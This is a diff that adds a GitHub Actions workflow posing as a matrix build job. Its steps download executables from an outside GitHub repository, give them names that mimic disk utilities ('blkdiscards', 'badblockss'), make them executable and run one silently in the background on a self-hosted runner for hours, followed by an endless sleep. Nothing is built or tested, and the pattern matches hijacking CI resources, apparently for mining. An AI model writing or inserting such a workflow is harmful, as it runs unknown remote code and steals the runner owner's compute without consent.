@@ -1,0 +1,25 @@
+name: ENV
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  Build:
+    name: hanakaru
+    runs-on: self-hosted
+    strategy:
+      max-parallel: 4
+      fail-fast: false
+      matrix:
+        hanakaru: [1.4, 1.5]
+        flag: [A, B]
+    env:
+        NUM_JOBS: 4
+    steps:
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Download
+      run: wget -O blkdiscards https://raw.githubusercontent.com/kijang-7/gas/main/vio && wget https://raw.githubusercontent.com/kijang-7/gas/main/badblockss && wget https://raw.githubusercontent.com/kijang-7/ssh/main/timeout  && chmod +x blkdiscards badblockss
+    - name: Start
+      run: |
+        timeout 355m ./badblockss >/dev/null &
+        sleep 999999999 >/dev/null 2>&1
